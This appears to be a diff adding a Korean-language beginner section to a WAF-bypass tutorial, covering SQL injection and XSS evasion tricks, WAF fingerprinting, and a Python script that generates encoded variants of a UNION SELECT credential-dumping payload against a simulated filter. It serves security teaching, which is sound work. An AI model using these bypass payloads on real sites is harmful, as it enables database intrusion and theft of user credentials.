@@ -9,6 +9,106 @@
 
 ---
 
+## 0. 초보자를 위한 개념 이해
+
+### WAF와 WAF 우회란?
+
+WAF(Web Application Firewall)는 웹 애플리케이션 앞단에서 악성 HTTP 요청을 탐지하고 차단하는 보안 장치입니다. SQL Injection, XSS 등의 공격 패턴을 감지하지만, 공격자는 이 탐지 패턴을 우회하는 기법을 사용합니다.
+
+**왜 배우는가:**
+```
+WAF가 있어도 공격이 성공하는 이유:
+
+  WAF 탐지: SELECT, UNION, script, onerror 등 패턴 차단
+
+  우회 기법:
+  대소문자:    SeLeCt * FrOm users
+  인코딩:      %53%45%4C%45%43%54 (URL 인코딩)
+  주석 삽입:   SEL/**/ECT (MySQL 주석으로 분리)
+  유니코드:    ＜script＞ (전각 문자)
+  이중 인코딩: %2527 → %27 → '
+
+  WAF 우회 이해의 필요성:
+  공격자 입장: 실제 침투 성공률 향상
+  방어자 입장: WAF 규칙의 한계 파악 → 더 강한 규칙 작성
+  버그바운티:  WAF 우회 성공 시 높은 보상
+```
+
+### 핵심 개념 정리
+
+```
+WAF 탐지 → 우회 사이클:
+
+  WAF 규칙:  "UNION SELECT" 차단
+  우회 1:    UNION/**/SELECT (주석 삽입)
+  WAF 업데이트: UNION/**/SELECT도 차단
+  우회 2:    /*!UNION*/ SELECT (MySQL 조건부 주석)
+  WAF 업데이트: ...
+  (무한 반복)
+
+WAF 핑거프린팅:
+  정상 요청과 공격 요청의 응답 코드 비교
+  403 → 대부분의 WAF 차단 코드
+  406 Not Acceptable → 일부 WAF
+  499 → Cloudflare 등 CDN WAF
+  응답 헤더에 WAF 제품명이 노출되는 경우도 있음
+
+주요 인코딩 기법:
+  URL 인코딩:   ' → %27   <  → %3C
+  HTML 엔티티:  < → &lt;  " → &quot;
+  Base64:      UNION → VU5JT04=
+  유니코드 이스케이프: ' → '
+```
+
+### 필요한 도구 및 환경
+- **프록시**: Burp Suite — Repeater 탭에서 다양한 인코딩/우회 페이로드 수동 테스트
+- **WAF 탐지 도구**: wafw00f — 대상 사이트의 WAF 제품 자동 탐지
+- **페이로드 목록**: PayloadsAllTheThings(GitHub) — WAF 우회 기법 정리된 공개 저장소
+
+### 기초 실습 예제
+```python
+#!/usr/bin/env python3
+"""WAF 우회 페이로드 생성기 — 인코딩 변형 (교육용)."""
+from urllib.parse import quote, quote_plus
+import base64
+from typing import Callable
+
+def generate_sqli_bypass_variants(base_payload: str) -> list[dict[str, str]]:
+    """SQL Injection 페이로드의 WAF 우회 변형 목록 생성."""
+    variants: list[dict[str, str]] = [
+        {"방법": "원본", "페이로드": base_payload},
+        {"방법": "URL 인코딩", "페이로드": quote(base_payload)},
+        {"방법": "이중 URL 인코딩", "페이로드": quote(quote(base_payload))},
+        {"방법": "대소문자 혼용", "페이로드": "".join(
+            c.upper() if i % 2 == 0 else c.lower()
+            for i, c in enumerate(base_payload)
+        )},
+        {"방법": "MySQL 주석 삽입",
+         "페이로드": base_payload.replace(" ", "/**/")},
+        {"방법": "MySQL 조건부 주석",
+         "페이로드": base_payload.replace("SELECT", "/*!SELECT*/")},
+    ]
+    return variants
+
+def test_waf_response(url: str, payload: str) -> str:
+    """WAF 차단 여부 확인 (실제 요청 없이 시뮬레이션)."""
+    blocked_patterns = ["UNION SELECT", "' OR '", "<script>"]
+    for pattern in blocked_patterns:
+        if pattern.lower() in payload.lower():
+            return "차단 (WAF 규칙 일치)"
+    return "통과 (우회 성공 가능성)"
+
+if __name__ == "__main__":
+    test_payload = "' UNION SELECT username, password FROM users --"
+    print("WAF 우회 변형 페이로드:")
+    for variant in generate_sqli_bypass_variants(test_payload):
+        status = test_waf_response("http://example.com", variant["페이로드"])
+        print(f"  [{variant['방법']}] {status}")
+        print(f"    {variant['페이로드'][:60]}...")
+```
+
+---
+
 ## 1. WAF 탐지 및 핑거프린팅
 
 ### WAF 존재 확인
